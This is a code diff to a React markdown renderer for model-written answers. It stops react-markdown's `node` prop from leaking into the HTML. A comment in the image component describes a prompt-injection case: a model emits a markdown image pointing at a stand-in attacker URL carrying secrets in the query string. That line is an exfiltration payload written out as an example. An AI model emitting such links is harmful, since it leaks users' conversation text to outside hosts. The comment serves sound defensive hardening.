@@ -25,7 +25,11 @@
  */
 
 import { useMemo, type ComponentProps } from 'react';
-import ReactMarkdown, { defaultUrlTransform, type Components } from 'react-markdown';
+import ReactMarkdown, {
+  defaultUrlTransform,
+  type Components,
+  type ExtraProps,
+} from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import { visit } from 'unist-util-visit';
 import type { Node, Parent } from 'unist';
@@ -79,7 +83,15 @@ const HEADING_LEVELS = { h1: 'h3', h2: 'h4', h3: 'h5', h4: 'h6', h5: 'h6', h6: '
 
 const heading = (from: keyof typeof HEADING_LEVELS) => {
   const Tag = HEADING_LEVELS[from];
-  return function Heading({ children, ...props }: React.HTMLAttributes<HTMLHeadingElement>) {
+  // `node` is destructured out of every component below and never spread. react-markdown hands
+  // each one the mdast node it came from, and React 19 renders an unknown lowercase prop as an
+  // attribute — so spreading the rest put `node="[object Object]"` on every heading, link, image
+  // and code span in every answer this app has rendered.
+  return function Heading({
+    children,
+    node: _node,
+    ...props
+  }: React.HTMLAttributes<HTMLHeadingElement> & ExtraProps) {
     return (
       <Tag className={`md-${from}`} {...props}>
         {children}
@@ -136,7 +148,7 @@ const components: Components = {
   h5: heading('h5'),
   h6: heading('h6'),
 
-  a({ href, children, ...props }) {
+  a({ href, children, node: _node, ...props }) {
     if (href?.startsWith(CITE_HREF)) {
       // No leading hole in the destructure: `slice` has already removed the `#cite/` prefix, so
       // the first element IS the kind. Skipping it put the kind in `id` and left `id` empty, and
@@ -156,7 +168,7 @@ const components: Components = {
     );
   },
 
-  img({ src, alt, ...props }) {
+  img({ src, alt, node: _node, ...props }) {
     // Answer text is model output, and a model under prompt injection can emit
     // `![](https://attacker/?q=<secret>)` — the browser then GETs that URL and the query string
     // leaks whatever the model was told to put in the `alt`/path, exfiltrating conversation text.
@@ -180,7 +192,7 @@ const components: Components = {
     );
   },
 
-  code({ className, children, ...props }) {
+  code({ className, children, node: _node, ...props }) {
     const text = String(children ?? '');
     const isBlock = Boolean(className?.startsWith('language-'));
     // An inline code span that looks like a structure gets a render affordance. Block code is
